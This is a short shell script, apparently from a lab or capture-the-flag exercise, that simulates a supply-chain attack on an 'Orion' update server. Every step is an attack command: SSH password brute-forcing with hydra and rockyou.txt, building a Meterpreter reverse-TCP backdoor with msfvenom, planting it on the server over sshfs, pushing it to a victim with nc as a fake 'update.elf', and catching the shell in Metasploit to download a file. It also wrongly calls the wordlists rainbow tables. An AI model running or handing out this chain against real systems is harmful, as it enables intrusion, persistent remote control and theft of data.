#!/bin/sh

# --- RUN ON THE CLIENT (VICTIM) HOST ---

# open a listening socket on client to simulate the communication with the Orion server 
nc -l -p 1234 > /home/pi/Desktop/update.elf
# execute the update (malicious backdoor)
./update.elf


# --- RUN ON THE ATTACKER HOST ---

# crack ssh password of the Orion server using hydra and two rainbow tables (users.txt and rockyou.txt)
hydra -L users.txt -P rockyou.txt \<SERVER_IP\> ssh

# create a backdoor (reverse shell TCP)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\<ATTACKER_IP\> LPORT=5555 -f elf > backdoor.elf

# move the backdoor from the attacker host to the Orion server using sshfs
mkdir /home/pi/Desktop/Orion
# mount the Orion server's file system on the attacker's file system
sshfs \<SERVER_USERNAME\>@\<SERVER_IP\>:/home/pi/Desktop /home/pi/Desktop/Orion
mv backdoor.elf /home/pi/Desktop/Orion
# unmount the Orion folder (mount point)
fusermount -u /home/pi/Desktop/Orion

# access the Orion server through ssh
ssh \<SERVER_IP\>
# send the backdoor to the client
cat /home/pi/Desktop/backdoor.elf | nc \<VICTIM_IP\> 1234
exit

# open a multi handler server with Metasploit 
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST \<ATTACKER_IP\>
set LPORT 5555
exploit
# download the challenge file
download /home/pi/Desktop/challenge.txt
exit
